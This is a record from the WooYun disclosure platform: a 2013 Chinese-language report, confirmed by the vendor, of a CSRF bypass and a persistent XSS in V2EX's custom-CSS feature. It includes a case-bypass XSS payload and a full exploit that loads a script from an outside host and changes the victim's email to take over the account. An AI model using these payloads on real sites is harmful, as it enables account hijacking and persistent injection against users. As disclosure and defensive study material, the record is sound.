{"id": 12555, "wybug_id": "wooyun-2013-021838", "wybug_title": "V2EX XSS-rootkit", "wybug_corp": "V2EX社区", "wybug_author": "Sogili", "wybug_date": "2013-04-15 10:52", "wybug_open_date": "2013-05-30 10:53", "wybug_type": "xss跨站脚本攻击", "wybug_level": "中", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["存储型", "技巧"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2013-04-15：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2013-04-15：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2013-04-25：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2013-05-05：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2013-05-15：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2013-05-30：\t细节向公众公开  简要描述： V2EX某功能存在缺陷导致rookit xss.rootkit xss 指可以长期控制一个账户,用户每次访问v2ex都会触发这个XSS.这样我们就有了一个xss shell. 详细说明：  1.一个CSRF导致账户被盗取风险漏洞说明:    由于判断来路的方式存在缺陷,导致我们可以通过下面这种方式绕过:解析 evil.com 的一个子域名为 v2ex.com.evil.com ,然后通过 v2ex.com.evil.com 这个域跨域post请求到 v2ex.com/setting 设置资料.攻击方式:    构造一个页面,在页面自动提交一个post表单到v2ex修改用户邮箱,之后我们就可以通过密码重置功能修改密码.2.rootkit xss    V2EX社区允许用户自定义css,但自定义的css是每次都输出到html里的,这导致了被闭合的可能.我做了一些测试发现</style>和<script>被过滤了,但大写形式并没有过滤.POC:\n</STYLE><SCRIPT>alert(1)</SCRIPT>\n利用前面的CSRF漏洞我们可以跨域设置用户的个性css代码植入rootkit xss.   漏洞证明：  exp:\n<script src=\"http://mmme.me/xss.js\"></script><script>xss.csrf('http://v2ex.com/settings',{'email':'pkav@gmail.com','bio':123,'list_rich':0,'show_balance':1,'show_hi_dpi':0,'show_my_nodes':0,'use_my_css':1,'my_css':'</STYLE><SCRIPT>alert(/pkav/)<\\/SCRIPT>','show_ads':1});</script>\n   修复方案：  这个漏洞我跟@Livid提过一次,但好像没有接受我的修复建议.当时没有做来路验证,自定义css可以通过</st</style>yle>进行绕过闭合.1.csrf可以建议使用token的方式验证2.自定义css没有了csrf,这个模块不过滤也没啥事.   版权声明：转载请注明来源 Sogili@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：6  确认时间：2013-04-15 11:57 厂商回复： 关于 POST 域名判断，谢谢你给了我们更好的思路。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2013-04-26 18:40 |    \t\t乌帽子 \t\t\t( 路人 |\t\t\t        Rank:29 漏洞数:3        | 学习黑客哪家强 | 中国山东找蓝翔 | sql...)\t\t \n  关注！楼下的你也在关注吗？    \n     2013-05-07 00:11 |    \t\twefgod \t\t\t( 普通白帽子  |\t\t\t        Rank:1807 漏洞数:170        | 力不从心)\t\t \n  @乌帽子 回楼上的，我已经看见内容了！    \n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 6, "Ranks": null}